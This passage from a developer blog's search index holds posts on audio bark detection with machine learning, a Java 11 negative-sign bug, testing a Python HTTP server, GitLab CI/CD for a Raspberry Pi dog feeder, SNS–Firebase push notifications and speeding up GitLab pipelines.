contain a bark. This can present a huge problem depending on the machine learning algorithm returning a totally biased model.\n\nIn order to fix that, you can do two things:\n\n\n  Oversample: create positive samples by synthetically creating new positive samples\n  Undersample: discard samples from the negative ones\n\n\nMore info: https://towardsdatascience.com/having-an-imbalanced-dataset-here-is-how-you-can-solve-it-1640568947eb\n\nI’ve used SMOTE (Synthetic Minority Over-sampling Technique) technique to perform the oversampling with very satisfactory results. In simple terms, SMOTE looks at the feature space for the minority class data points and considers its k nearest neighbours.\n\nTo do that I’ve used imbalanced-learn python libary and it’s really simple:\n\ndef fix_imbalance(X, Y):\n    over = SMOTE(sampling_strategy=0.1)\n    under = RandomUnderSampler(sampling_strategy=0.5)\n    steps = [(&#39;o&#39;, over), (&#39;u&#39;, under)]\n    pipeline = Pipeline(steps=steps)\n    X_fix, Y_fix = pipeline.fit_resample(X, Y)\n    return X_fix, Y_fix\n\n\nNote that the library also provides a module to perform majority under sampling. The two methods are combined in a pipeline to fix the dataset imbalance problem.\n\nUsing the training model\n\nNow we have our logistic regression model trained and is working quite well. It’s time to put it on the Raspberry Pi.\n\nFirst of all, we need a way to export the model outside of the training python code. In order to do that, I use the joblib library:\n\n# Write the model\nlr = LogisticRegression(max_iter=1000)\nlr.fit(X_train, y_train)\njoblib.dump(lr, &#39;lr.pkl&#39;, compress=9)\n\n\njoblib serialize the object into that file and then Raspberry Pi can load the model object:\n\nmodel = joblib.load(&#39;lr.pkl&#39;)\n\n\nNow we can retrieve the more recent fully recorded audio file:\n\ndef last_fully_written_file():\n    return audios_path + &quot;/&quot; + sorted(os.listdir(audios_path))[-2]\n\nIf the script query the last file, it might happen that is not fully written by that time.\n\nSplit it into chunks of one second and for each chunk run the prediction:\n\ndef has_bark_in_minute(filename):\n    model = joblib.load(&#39;lr.pkl&#39;)\n\n    audio_data, __ = load_audio_from_file(filename)\n    chunks = split_in_one_second_chunks(audio_data, sample_rate)\n    chunk_predictions = []\n    for chunk in chunks:\n        if len(chunk) == sample_rate:\n            mfccs = extract_mfcc(chunk)\n            chunk_predictions.append(model.predict(np.array([mfccs]))[0])\n\n    return chunk_predictions.count(1) &amp;gt; 2, chunk_predictions\n\n\nSince the model is probabilistic, it might happen to have false positive or negatives. In order to avoid that, the function has_bark_in_minute will only return True when more than two barks are detected for one minute.\n\nLast but not least, when a bark is detected, the script will send me a message over telegram:\n\ndef send_to_telegram(predictions, filename):\n    date = filename.split(&quot;-&quot;)[-1].split(&quot;.mp3&quot;)[0]\n\n    welcome_msg = f&quot;Detected {predictions.count(1)} barks on {date}&quot;\n\n    response = requests.post(\n        f&quot;https://api.telegram.org/bot{get_token()}/sendMessage&quot;,\n        data={&quot;chat_id&quot;: telegram_group_id, &quot;text&quot;: welcome_msg},\n    )\n    print(response.text)\n\n\n\n\n\n\n\nExample of messages in Telegram\n\n\n"
} ,
  
  {
    "title"    : "Java 11 negative symbol in Swedish",
    "category" : "",
    "tags"     : " java, java11",
    "url"      : "/java11-negative-symbol-swedish/",
    "date"     : "May 6, 2021",
    "excerpt"  : "We performed a migration to Java 11 and a bug fix about negative symbol for negative numbers in Java ruined our implementation. This article describes the situation and the lessons learned.\n\n\n\nIn the middle of a migration of a project to Java 11 a...",
  "content"  : "We performed a migration to Java 11 and a bug fix about negative symbol for negative numbers in Java ruined our implementation. This article describes the situation and the lessons learned.\n\n\n\nIn the middle of a migration of a project to Java 11 a very curious scenario has appeared. We face a bug while dealing with negative numbers. We have a function to convert a positive number to negative. The implementation was working fine for Java 8 but not for Java 11:\n\npublic String negativeNumber(int number) {\n    return &quot;-&quot; + number;\n}\n\n\nThe error appeared while trying to parse the numbers generated with that function:\n\npublic Number parse(String number) throws ParseException {\n    return fmt.parse(number)\n}\n\n\nMore precisely, it was throwing the following exception:\n\nUnparseable number: &quot;-1&quot;\njava.text.ParseException: Unparseable number: &quot;-1&quot;\n\tat java.base/java.text.NumberFormat.parse(NumberFormat.java:431)\n\tat SwedishNegativeSymbol.shouldParseNegativeNumberButFailsOnJava11(SwedishNegativeSymbol.java:23)\n\n\nThe investigation and debug led us to compare our negative symbol with the one expected by the NumberFormat:\n\n@Test\npublic void shouldUseSameNegativeSymbol() {\n    String expectedNegativeSymbol = fmt.getNegativePrefix();\n    String negativeSymbol = negate(1).substring(0, 1);\n    assertEquals(&quot;Negative symbols do not match!&quot;, expectedNegativeSymbol, negativeSymbol);\n}\n\n\nAnd… surprise, the test pass on Java 8 but not in Java 11:\n\nNegative symbols do not match! expected:&amp;lt;[−]&amp;gt; but was:&amp;lt;[-]&amp;gt;\nExpected :−\nActual   :-\n\norg.junit.ComparisonFailure: Negative symbols do not match! expected:&amp;lt;[−]&amp;gt; but was:&amp;lt;[-]&amp;gt;\n\tat org.junit.Assert.assertEquals(Assert.java:115)\n\tat SwedishNegativeSymbol.shouldUseSameNegativeSymbol(SwedishNegativeSymbol.java:35)\n\n\nWTF!. Why on earth the negative symbol do not match? The response is here: JDK-8214926.\n\nIt looks like the negative symbol returned in Java 8 was wrong and Java authors decided to fix that in Java11. The two characters are visually very similar:\n\n\n  − Minus-sign\n  - Hyphen-minus\n\n\nThe solution was straightforward: use the negative symbol provided by NumberFormat\n\npublic String negativeNumberWorkingOnJava11(int number) {\n    DecimalFormat fmt = (DecimalFormat) NumberFormat.getInstance(Locale.forLanguageTag(&quot;se-sv&quot;));\n    return fmt.getNegativePrefix() + number;\n}\n\n\nNow the test passes both in Java 8 and Java 11.\n\nThe lesson learned was important: DO NOT HARDCODE NEGATIVE SYMBOL!\n\nYou can find the source code here: SwedishNegativeSymbol.java\n"
} ,
  
  {
    "title"    : "Testing python BaseHttpServer",
    "category" : "",
    "tags"     : " python, testing, mocking",
    "url"      : "/testing-python-base-http-server/",
    "date"     : "February 18, 2021",
    "excerpt"  : "While the development of https://www.agalera.eu/standalone-app-raspberry-pi/ I needed to use python&#39;s BaseHttpServer and inject some dependencies into it.\n\nIt turns out, there&#39;s no easy way of doing that. Moreover, I wanted to achieve 100% code co...",
  "content"  : "While the development of https://www.agalera.eu/standalone-app-raspberry-pi/ I needed to use python&#39;s BaseHttpServer and inject some dependencies into it.\n\nIt turns out, there&#39;s no easy way of doing that. Moreover, I wanted to achieve 100% code coverage testing, so I should found a way of testing that code.\n\n\n\nHere’s the code I need to test:\n\nimport socketserver\nfrom http import server\n\n\nclass DogFeederServer(server.BaseHTTPRequestHandler):\n    def __init__(self, camera_output, call_dog, servo, *args, **kwargs):\n        self.camera_output = camera_output\n        self.call_dog = call_dog\n        self.servo = servo\n        # BaseHTTPRequestHandler calls do_GET **inside** __init__ !!!\n        # So we have to call super().__init__ after setting attributes.\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        if self.path == &quot;/stream.mjpg&quot;:\n            self.send_response(200)\n            # do some magic with HTTP Streaming\n        else:\n            self.send_error(404)\n        self.end_headers()\n\n    def do_POST(self):\n        if self.path == &quot;/api/call&quot;:\n            if self.call_dog():\n                self.send_response(200)\n            else:\n                self.send_response(500)\n        elif self.path == &quot;/api/treat&quot;:\n            self.servo.open_and_close()\n            self.send_response(200)\n        else:\n            self.send_error(404)\n        self.end_headers()\n\n\nclass StreamingServer(socketserver.ThreadingMixIn, server.HTTPServer):\n    allow_reuse_address = True\n    daemon_threads = True\n\n\nAs you can see, the code is really simple.\n\nThe problem comes when you realise there are no easy way of calling the constructor of the server and pass the dependencies\n\nPassing dependencies on the constructor\n\nHopefully I discovered this StackOverflow post where someone has experience the same issue: https://stackoverflow.com/questions/21631799/how-can-i-pass-parameters-to-a-requesthandler\n\nI really like the approach of the “partial” application: we pass the arguments before and once the app is created with the arguments, is passed to the server:\n\naddress = (&quot;&quot;, 8000)\nhandler = partial(\n    DogFeederServer,\n    camera_output,\n    call_dog,\n    servo,\n)\nserver = StreamingServer(address, handler)\nserver.serve_forever()\n\n\nOnce we have the “partial” approach, we could easily provide mocks for the dependencies in the tests\n\nTest the server\n\nThe only way of testing the base HTTP server I found is to create some sort of “integration testing”: provide mocks to the server but actually start the HTTP server. To test the whole logic, we could use requests library to do the HTTP calls:\n\nimport socket\nfrom functools import partial\nfrom threading import Thread\nfrom unittest import TestCase\nfrom unittest.mock import MagicMock\n\nimport requests\n\nfrom dogfeeder.server import DogFeederServer, StreamingServer\n\n\nclass ServerTest(TestCase):\n    def setUp(self):\n        super(ServerTest, self).setUp()\n        self.get_free_port()\n        self.camera_output_mock = MagicMock()\n        self.call_dog_mock = MagicMock()\n        self.servo_mock = MagicMock()\n        address = (&quot;&quot;, self.mock_server_port)\n        handler = partial(\n            DogFeederServer,\n            self.camera_output_mock,\n            self.call_dog_mock,\n            self.servo_mock,\n        )\n        self.mock_server = StreamingServer(address, handler)\n\n        # Start running mock server in a separate thread.\n        # Daemon threads automatically shut down when the main process exits.\n        self.mock_server_thread = Thread(target=self.mock_server.serve_forever)\n        self.mock_server_thread.setDaemon(True)\n        self.mock_server_thread.start()\n\n    def test_servo_open_close(self):\n        url = f&quot;http://localhost:{self.mock_server_port}/api/treat&quot;\n        response = requests.post(url)\n        self.servo_mock.open_and_close.assert_called_once()\n        assert response.status_code == 200\n\n\n    def test_invalid_path(self):\n        url = f&quot;http://localhost:{self.mock_server_port}/unknown&quot;\n        response = requests.post(url)\n        assert response.status_code == 404\n        response = requests.get(url)\n        assert response.status_code == 404\n\n    def tearDown(self):\n        super(ServerTest, self).tearDown()\n\n    def get_free_port(self):\n        s = socket.socket(socket.AF_INET, type=socket.SOCK_STREAM)\n        s.bind((&quot;localhost&quot;, 0))\n        __, port = s.getsockname()\n        s.close()\n        self.mock_server_port = port\n\n\nThe key here is to start a daemon thread (that will die when the test ends) to start the HTTP server\n"
} ,
  
  {
    "title"    : "Standalone application for Raspberry Pi",
    "category" : "",
    "tags"     : " linux, nodejs, raspberry-pi, devops, docker",
    "url"      : "/standalone-app-raspberry-pi/",
    "date"     : "February 18, 2021",
    "excerpt"  : "I&#39;m building a small application to give treats to my dog in a remote manner. \n\nI setup a Raspberry Pi with a very basic HTTP server connected to a servo motor that will open or close the deposit where the treats are stored. \n\nIn this article I&#39;ll...",
  "content"  : "I&#39;m building a small application to give treats to my dog in a remote manner. \n\nI setup a Raspberry Pi with a very basic HTTP server connected to a servo motor that will open or close the deposit where the treats are stored. \n\nIn this article I&#39;ll explain all the challenges I found to make this application standalone.\n\n\nRequirements\n\n\n  Accessible via web\n  To have a camera, a button to give treats and a button to play a sound\n  Easily installable in a Raspberry Pi: no need to install trillions of libraries\n  Production ready: even though this is a personal project, I want the app to be 100% test covered and to have a full CI/CD cycle\n\n\nSolutions\n\nFirst of all, I did some small investigations and tackle every requirement in a separate way. This way I manage to found scripts that:\n\n\n  Create a MJPEG stream out of the Raspberry Pi camera\n  Play a sound from the disk\n  Interact with a servo motor\n\n\nBackend\n\nOnce the parts are working independently, I made a python project with a very basic HTTP server based on BaseHTTPRequestHandler that receive request to the stream, to interact with the servo and to play a sound.\n\nThe interesting thing here was to be able to develop this project without using the Raspberry Pi. This is challenging because the required libraries are hardware specific to the Raspberry. But I manage to mock the camera and the servo libraries by using unittest python package\n\nfrom unittest.mock import MagicMock, patch\n\n\ndef mock_rpi_gpio():\n    MockRPi = MagicMock()\n    modules = {\n        &quot;RPi&quot;: MockRPi,\n        &quot;RPi.GPIO&quot;: MockRPi.GPIO,\n    }\n    patcher = patch.dict(&quot;sys.modules&quot;, modules)\n    patcher.start()\n\n\ndef mock_pi_camera():\n    picamera = MagicMock()\n    modules = {&quot;picamera&quot;: picamera, &quot;picamera.PiCamera&quot;: picamera.PiCamera}\n    patcher = patch.dict(&quot;sys.modules&quot;, modules)\n    patcher.start()\n\n\nmock_rpi_gpio()\nmock_pi_camera()\n\n\nunittest module allows you to define a conftest.py file that will be executed as a configuration step for you unit tests. Having done that, we can have tests that covers all the required functionality, even without installing the required libraries:\n\nfrom unittest.mock import call\n\nimport RPi.GPIO as mockGPIO\n\nfrom dogfeeder.servo import Servo\n\n\ndef test_initialize_closed_servo():\n    Servo()\n    mockGPIO.setmode.assert_called_once_with(mockGPIO.BCM)\n    mockGPIO.setup.assert_called_once_with(Servo.SERVO_PIN, mockGPIO.OUT)\n    mockGPIO.PWM.assert_called_once_with(Servo.SERVO_PIN, 50)\n    mock_pwm = mockGPIO.PWM()\n    mock_pwm.start.assert_called_once_with(Servo.CLOSED)\n\nFrontend\n\nThe implementation of the frontend is super simple. I used React to create 3 components:\n\n\n  CallButton: the button that plays an audio file\n  DispenseTreat: the button that interacts with the servo\n  WebcamContainer: the img that prints the MJPEG stream out of the Pi Camera.\n\n\nWhen any button is pressed and API call to backend is done in the background.\n\nNothing really fancy to see here.\n\nCI/CD\n\nWhen all the logic is done and the tests are passing, I decided that I wanted to go full professional and create a CI/CD pipeline for the project. In order to do that, I used gitlab.com\n\nThis has been the most challenging piece of the project. I wanted to create a standalone application so the installation process is keep to the minimum bar. In order to do so, I created a docker image with all the required dependencies to be used by Gitlab pipeline.\n\nDocker image\n\nFROM balenalib/raspberrypi3-python:3.7-buster\nRUN apt update &amp;amp;&amp;amp; apt upgrade\nRUN apt install build-essential binutils zlib1g-dev\nRUN apt install python3-picamera python3-rpi.gpio\nRUN pip3 install pyinstaller pytest pytest-cov flake8 requests\n\n\nIt’s based on balenalib/raspberrypi3-python Docker image, that simulates even the hardware and processor architecture of the Raspberry Pi 3. The docker image also contains all the libraries required to work (picamera, gpio, …) and tools for the CI/CD (pytest, flake8).\n\npyinstaller is installed in order to generate the executable file of the backend\n\nPipeline\n\nThe pipeline contains four stages:\n\n  test: unit tests of the backend and frontend\n  release: to generate semantic versioned tags of the project\n  build: to generate the standalone executable file of the backend and the web site for the frontend. Thanks to https://threedots.tech/post/automatic-semantic-versioning-in-gitlab-ci/\n  publish: I decided to store the generated artifacts within the Gitlab Package Registry\n\n\nstages:\n  - test\n  - release\n  - build\n  - publish\n\ntest-backend:\n  image: registry.gitlab.com/adrian.galera/dogfeeder/python-ci\n  stage: test      \n  script: \n    - cd dogfeeder-backend\n    - pytest --cov --cov-fail-under=100\n  only:\n    - master\n    - branches\n\ntest-frontend:\n  image: node:12.13-alpine\n  stage: test\n  script:\n    - cd dogfeeder-web\n    - npm ci --cache .npm --prefer-offline\n    - npm test\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n  only:\n    - master\n    - branches\n\nrelease:\n  image: python:3.7-stretch\n  stage: release\n  before_script:\n    # Allow gitlab runner push code to gitlab.com\n    # see: https://threedots.tech/post/automatic-semantic-versioning-in-gitlab-ci/\n    - mkdir -p ~/.ssh &amp;amp;&amp;amp; chmod 700 ~/.ssh\n    - ssh-keyscan gitlab.com &amp;gt;&amp;gt; ~/.ssh/known_hosts &amp;amp;&amp;amp; chmod 644 ~/.ssh/known_hosts\n    - eval $(ssh-agent -s)\n    - ssh-add &amp;lt;(echo &quot;$SSH_PRIVATE_KEY&quot;)\n    - pip install semver\n  script:\n    - python3 gen-semver\n  only:\n    - master\n  when: manual\n\nbuild-backend:\n  image: registry.gitlab.com/adrian.galera/dogfeeder/python-ci\n  stage: build\n  script: \n    - cd dogfeeder-backend\n    - pyinstaller dogfeeder/main.py -F --name dogfeeder-server\n  only:\n    - tags        \n  artifacts:\n    paths:\n     - &quot;dogfeeder-backend/dist/dogfeeder-server&quot;\n\nbuild-frontend:\n  image: node:12.13-alpine\n  stage: build\n  script:\n    - cd dogfeeder-web\n    - npm ci --cache .npm --prefer-offline\n    - npm run build\n    - npm run zip\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n  artifacts:\n    paths:\n     - &quot;dogfeeder-web/dogfeeder-web_.zip&quot;\n  only:\n    - tags  \n\npublish:\n  image: curlimages/curl:latest\n  stage: publish\n  script:\n   - VERSION=${CI_COMMIT_REF_NAME}\n   - &#39;curl --header &quot;JOB-TOKEN: $CI_JOB_TOKEN&quot; --upload-file dogfeeder-backend/dist/dogfeeder-server &quot;${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/generic/dogfeeder/${VERSION}/dogfeeder-server&quot;&#39;\n   - &#39;curl --header &quot;JOB-TOKEN: $CI_JOB_TOKEN&quot; --upload-file dogfeeder-web/dogfeeder-web_.zip &quot;${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/generic/dogfeeder/${VERSION}/dogfeeder-web.zip&quot;&#39;  \n  only:\n    - tags\n\n\nInstallation\n\nNow that the packages are stored in Gitlab, the installation is super simple. I created a script that downloads the artifacts from Gitlab and unzip the web into a running nginx and replace the executable file that will be picked up from a supervisorctl process:\n\nVERSION=$1\nTOKEN=${GITLAB_ACCESS_TOKEN}\n\nif [ -z &quot;$1&quot; ]; then\n    echo &quot;You need to provide PACKAGE_VERSION as argument: sudo ./install-dogfeeder.sh &amp;lt;PACKAGE_VERSION&amp;gt;&quot;\n    exit 1\nfi\n\nif [ -z &quot;$TOKEN&quot; ]; then\n    echo &quot;You need to set GITLAB_ACCESS_TOKEN environment variable&quot;\n    exit 1\nfi\n\nwget --header &quot;PRIVATE-TOKEN: ${TOKEN}&quot; &quot;https://gitlab.com/api/v4/projects/24187261/packages/generic/dogfeeder/${VERSION}/dogfeeder-server&quot; -O /tmp/dogfeeder-server-${VERSION}\nwget --header &quot;PRIVATE-TOKEN: ${TOKEN}&quot; &quot;https://gitlab.com/api/v4/projects/24187261/packages/generic/dogfeeder/${VERSION}/dogfeeder-web.zip&quot; -O /tmp/dogfeeder-web-${VERSION}.zip\n\nunzip -o /tmp/dogfeeder-web-${VERSION}.zip -d /var/www/html/.\n# Kill the process and supervisorctl will start it again:\nps -eaf | grep &quot;dogfeeder-server&quot; | grep -v grep | awk &#39;{ print $2 }&#39; | xargs kill -9 &amp;amp;&amp;amp; cp /tmp/dogfeeder-server-${VERSION} /home/pi/.local/bin/dogfeeder-server\nchmod +x /home/pi/.local/bin/dogfeeder-server\n\n"
} ,
  
  {
    "title"    : "Push notifications SNS and Firebase",
    "category" : "",
    "tags"     : " aws, sns, mobile, java, backend, firebase",
    "url"      : "/sns-firebase-android-ios/",
    "date"     : "November 20, 2020",
    "excerpt"  : "Currently we’re investigating usage of SNS to send Push notifications. We have some friends working already with Firebase and recommend us to check it out. We discovered that SNS supports sending messages to Firebase. However, not everything is as...",
  "content"  : "Currently we’re investigating usage of SNS to send Push notifications. We have some friends working already with Firebase and recommend us to check it out. We discovered that SNS supports sending messages to Firebase. However, not everything is as easy as it looks like.\n\n\n\nHow push notifications work\n\nThere are quite a lot of moving parts in the scenario:\n\n\n  AWS SNS: Messaging system from AWS\n  Firebase Cloud Messaging (FCM): Message system to connect with the devices\n  Device: device that receives push notification\n\n\nThe communication works this way:\n\n\n  The mobile device is registered within FCM.\n  FCM answers with a token that identifies the user. For the sake of testing\nthis will be manually extracted, however when doing this in PRD,\nwe need to automate this process.\n  In AWS SNS, a platform app has been created connecting AWS SNS with\nFCM with the provided API credentials (see section below)\n  WIth the token obtained in step 2). A new app endpoint is created.\nThis endpoint identifies the app that registered the token\n  When the backend wants to send the push notification, it uses the\nregistered app endpoint for that token.\n  SNS forwards the message to FCM\n  FCM sends the message to the mobile device\n\n\n\n\nTesting FCM device configuration\n\nThe preliminary test are done using an android application because I’m more used to Android development. Once FCM is setup, we could obtain the token from the device and try to send a push notification from FCM console to the device. If we do that, we receive a message with an structure similar to:\n\n{  \n    &quot;notification&quot; : {\n        &quot;title&quot;: &quot;Test notification&quot;,\n        &quot;body&quot;: &quot;Test notification body&quot;\n    },\n    &quot;data&quot;: {\n\n    }\n}\n\n\nSo far, so good. We can do the same test from FCM to IOS and we will receive the same payload and the notification will pop up.\n\nTesting SNS FCM connection\n\nAfter following this guide, now we have connected SNS with FCM.\n\nWe can try sending a message to the mobile device by specifying the app endpoint. We can access through AWS Console to SNS UI and search for app plattform and the app endpoint that belongs to our device.\n\nIf we go the default way and send a message, our Android device will receive a message similar to:\n\n{  \n    &quot;data&quot;: {\n        &quot;default&quot;: &quot;Test message&quot;\n    }\n}\n\n\nComparing the received data with the previous one, we see a fundamental difference: the notification field is empty and the message is inserted in the data field inside a default field.\n\nIf we repeat the same operation for an iOS device, we will not receive the push notification.\n\nTo send in this default way from Java, we could use the following code:\n\npublic void publishDefaultMessage(String endpoint) {\n    PublishRequest publishRequest = PublishRequest.builder()\n            .message(getTextMessage())\n            .targetArn(endpoint)\n            .build();\n\n    PublishResponse result = snsClient.publish(publishRequest);\n    System.out.println(result.messageId() + &quot; Message sent. Status was &quot; + result.sdkHttpResponse().statusCode());\n}\n\n\nSending to Android and iOS\n\nIf we want to be able to send both to Android and iOS through FCM, we need to send a custom payload to SNS. If we send with default configuration, Android can receive the notification but not iOS.\n\nTo do so, we need to provide a JSON message as the payload:\n\n{&quot;GCM&quot;:&quot;{\\&quot;notification\\&quot;:{\\&quot;title\\&quot;:\\&quot;Title\\&quot;,\\&quot;body\\&quot;:\\&quot;Notification body sent with custom payload\\&quot;},\n\\&quot;data\\&quot;:{\\&quot;orderId\\&quot;:\\&quot;1234\\&quot;,\\&quot;customerId\\&quot;:\\&quot;1234\\&quot;}}&quot;}\n\n\nWe can send that test message from AWS Console, specifying to send different payload per protocol. Or we can do it through code:\n\npublic void publishCustomMessage(String endpoint) {\n    PublishRequest publishRequest = PublishRequest.builder()\n            .message(customFirebaseMessage())\n            .targetArn(endpoint)\n            .messageStructure(&quot;json&quot;) // Send custom payload per transport type\n            .build();\n\n    PublishResponse result = snsClient.publish(publishRequest);\n    System.out.println(result.messageId() + &quot; Message sent. Status was &quot; + result.sdkHttpResponse().statusCode());\n}\nprivate String customFirebaseMessage() {\n    Map&amp;lt;String, String&amp;gt; customMessage = new HashMap&amp;lt;&amp;gt;();\n    final String FIREBASE_PROTOCOL = &quot;GCM&quot;;\n    customMessage.put(FIREBASE_PROTOCOL, getFirebaseMessage());\n    return new Gson().toJson(customMessage);\n}\nprivate String getFirebaseMessage() {\n    FirebaseMessage message = new FirebaseMessage()\n            .withTitle(&quot;Title&quot;)\n            .withBody(&quot;Notification body sent with custom payload&quot;)\n            .withDataEntry(&quot;customerId&quot;, &quot;1234&quot;)\n            .withDataEntry(&quot;orderId&quot;, &quot;1234&quot;);\n    return message.toJson();\n}\n\n\nWhere FirebaseMessage is an object we have created:\n\npublic class FirebaseMessage {\n    private final Map&amp;lt;String, Object&amp;gt; notification = new HashMap&amp;lt;&amp;gt;();\n    private final Map&amp;lt;String, Object&amp;gt; data = new HashMap&amp;lt;&amp;gt;();\n\n    public FirebaseMessage withTitle(String title) {\n        this.notification.put(&quot;title&quot;, title);\n        return this;\n    }\n\n    public FirebaseMessage withBody(String body) {\n        this.notification.put(&quot;body&quot;, body);\n        return this;\n    }\n\n    public FirebaseMessage withDataEntry(String key, String value) {\n        this.data.put(key, value);\n        return this;\n    }\n\n    public String toJson() {\n        return new Gson().toJson(this);\n    }\n}\n\n\nIf we send the messages with this format, they will be received both in Android and iOS\n"
} ,
  
  {
    "title"    : "Gitlab improvements: caches and Docker",
    "category" : "",
    "tags"     : " devops, ci/cd, gitlab, react, docker, frontend",
    "url"      : "/gitlab-docker-image/",
    "date"     : "May 22, 2020",
    "excerpt"  : "Gitlab or any other CI/CD system works really great to have an automated build system. However, you can waste lots of time if you don’t think about carefully. Every job needs to download the build tools and dependencies, so that’s a lot of time th...",
  "content"  : "Gitlab or any other CI/CD system works really great to have an automated build system. However, you can waste lots of time if you don’t think about carefully. Every job needs to download the build tools and dependencies, so that’s a lot of time that could be reduced.\n\nIn this article I describe two techniques to avoid wasting that much time. First one is using a cache for the dependencies and the second is using a pre-built Docker image with the required build tools.\n\n\n\nScenario\n\nWe will be building a simple react application to be deployed into an S3 Bucket. This simple react application contains a bunch of npm dependencies to simulate a real application. You can find the code here: https://gitlab.com/adrian.galera/gitlab-docker-react.\n\nTo simulate a real work environment, let’s define a pipeline consisting in three steps:\n\n\n  test: runs the tests defined in the project\n  build: produce the artifact to be deployed\n  deploy: deploy the artifact to an AWS S3 Bucket\n\n\nBasic pipeline\n\nIn this basic pipeline, no cache nor Docker is configured. Each job needs to download everything:\n\ntest frontend:\n  image: node:12.13-alpine\n  stage: test\n  script:\n    - npm install\n    - npm test\n\nbuild frontend:\n  image: node:12.13-alpine\n  stage: build\n  script:\n    - npm install\n    - npm build\n  only:\n    - master\n\ndeploy frontend:\n  image: node:12.13-alpine\n  stage: deploy\n  script:\n    - apk add python curl build-base zip\n    - curl &quot;https://s3.amazonaws.com/aws-cli/awscli-bundle.zip&quot; -o &quot;awscli-bundle.zip&quot;\n    - unzip -o awscli-bundle.zip\n    - ./awscli-bundle/install -i /usr/local/aws -b /usr/local/bin/aws\n    - aws --version\n    - aws s3 sync build s3://random-bucket\n  only:\n    - master\n\n\ntest and build jobs use a nodejs Docker image and install all the dependencies and run the scripts. deploy job uses the same image and downloads and install the awsclient in order to upload the built artifact to a S3 bucket.\n\nNext step is to measure the time:\n\n\n  \n    \n      Test\n      Build\n      Deploy\n      Total\n    \n    \n      1m 24s\n      1m 26s\n      57 s\n      3m 48 s\n    \n  \n\n\nThat’s a lot of time wasted downloading dependencies or installing tools. In the next section we will reduce it by using caches\n\nCaching node_modules\n\nWe can use Gitlab cache feature to keep the contents of the node_modules folder instead of downloading them every time. It’s really simple to set it up:\n\nstages:\n  - test\n  - build\n  - deploy\n\ntest frontend:\n  image: node:12.13-alpine\n  stage: test\n  script:\n    - npm ci --cache .npm --prefer-offline\n    - npm test\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n\nbuild frontend:\n  image: node:12.13-alpine\n  stage: build\n  script:\n    - npm ci --cache .npm --prefer-offline\n    - npm build\n  only:\n    - master\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n\ndeploy frontend:\n  image: node:12.13-alpine\n  stage: deploy\n  script:\n    - apk add python curl build-base zip\n    - curl &quot;https://s3.amazonaws.com/aws-cli/awscli-bundle.zip&quot; -o &quot;awscli-bundle.zip&quot;\n    - unzip -o awscli-bundle.zip\n    - ./awscli-bundle/install -i /usr/local/aws -b /usr/local/bin/aws\n    - aws --version\n    - aws s3 sync build s3://random-bucket\n  only:\n    - master\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n\n\nWe only need to tell npm to work with the cache with this line:\n\nnpm ci --cache .npm --prefer-offline instead of the traditional npm install\n\nand configure the cache in each job:\n\ncache:\n  key: &quot;node-modules&quot;\n  paths:\n    - .npm/\n\n\nWe are telling gitlab to store the .npm folder in the cache named node-modules\n\nThe time improvement can observed in the following table:\n\n\n  \n    \n      Test\n      Build\n      Deploy\n      Total\n    \n    \n      1m 3s\n      57s\n      56s\n      2m 54s\n    \n  \n\n\nWe can observe a huge decrease in the test and build jobs. The time spent on deploy is pretty similar to the one before.\n\nUsing Docker image\n\nThe deploy job is downloading and installing the awsclient to upload the built artifact to S3 bucket. We could improve that time by using a Docker image which already contains\nthe awslcient. In order to do so, we can build our own image and store it in Gitlab Container Registry. The Container registry can be found in the side bar: Packages &amp;amp; Resgistries -&amp;gt; Container Registry\n\nWe will build an image with nodejs 12:13 and the aws client. In order to do so, we will use the following Dockerfile:\n\nFROM node:12.13-alpine\nRUN apk add python curl build-base zip\nRUN curl &quot;https://s3.amazonaws.com/aws-cli/awscli-bundle.zip&quot; -o &quot;awscli-bundle.zip&quot;\nRUN unzip -o awscli-bundle.zip\nRUN ./awscli-bundle/install -i /usr/local/aws -b /usr/local/bin/aws\nRUN aws --version\n\n\nBasically, the Dockerfile is running the same commands as the pipeline, but only once. Once is the image is built, we push it to the registry and we start using it. No need to install anything!\n\nTo build and push the image, you only need to run the following commands:\n\ndocker login registry.gitlab.com\ndocker build -t registry.gitlab.com/&amp;lt;user&amp;gt;/&amp;lt;project&amp;gt;/node_python_aws .\ndocker push registry.gitlab.com/&amp;lt;user&amp;gt;/&amp;lt;project&amp;gt;/node_python_aws\n\n\nOnce is pushed we can use it in the pipeline in combination with the cache:\n\nstages:\n  - test\n  - build\n  - deploy\n\ntest frontend:\n  image: registry.gitlab.com/&amp;lt;user&amp;gt;/&amp;lt;project&amp;gt;/node_python_aws\n  stage: test\n  script:\n    - npm ci --cache .npm --prefer-offline\n    - npm test\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n\nbuild frontend:\n  image: registry.gitlab.com/&amp;lt;user&amp;gt;/&amp;lt;project&amp;gt;/node_python_aws\n  stage: build\n  script:\n    - npm ci --cache .npm --prefer-offline\n    - npm build\n  only:\n    - master\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n\ndeploy frontend:\n  image: registry.gitlab.com/&amp;lt;user&amp;gt;/&amp;lt;project&amp;gt;/node_python_aws\n  stage: deploy\n  script:\n    - aws s3 sync build s3://random-bucket\n  only:\n    - master\n  cache:\n    key: &quot;node-modules&quot;\n    paths:\n      - .npm/\n\n\nNote that in the deploy job, we’re only using the aws command directly.\n\nWe can notice and decrease in time on the deploy pipeline, as we were expecting:\n\n\n  \n    \n      Test\n      Build\n      Deploy\n      Total\n    \n    \n      1m 9s\n      1m 2s\n      35s\n      2m 46s\n    \n  \n\n\nThe decrease of time, might not look like it’s very big, but that’s because that’s a very simple example.\n\nFor bigger projects, the improvements can be huge, since there are lots of dependencies and build tools that could be cached or pre-installed\n\nWrap up\n\nWe have seen different techniques to speedup Gitlab pipeline: using caches for dependencies and Docker image to pre-install build tools.\n\nYou can find the comparisson tables of the different approaches hereunder:\n\n\n  \n    \n      Improvement\n      Test\n      Build\n      Deploy\n      Total\n    \n    \n      None\n      1m 24s\n      1m 26s\n      57s\n      3m 48s\n    \n    \n      Cache\n      1m 3s\n      57s\n      56s\n      2m 54s\n    \n    \n      Cache + Docker\n      1m 9s\n      1m 